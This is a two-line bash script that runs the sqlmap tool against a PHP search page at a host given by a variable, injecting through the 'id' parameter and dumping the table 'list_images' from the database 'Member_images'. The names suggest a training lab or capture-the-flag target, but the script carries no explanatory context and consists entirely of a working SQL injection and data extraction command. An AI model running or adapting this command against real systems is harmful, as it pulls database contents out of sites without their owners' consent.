#!/bin/bash

sqlmap -u "http://$IP_ADDRESS/index.php?page=searchimg&id=1&Submit=Submit#" --dump -T list_images -D Member_images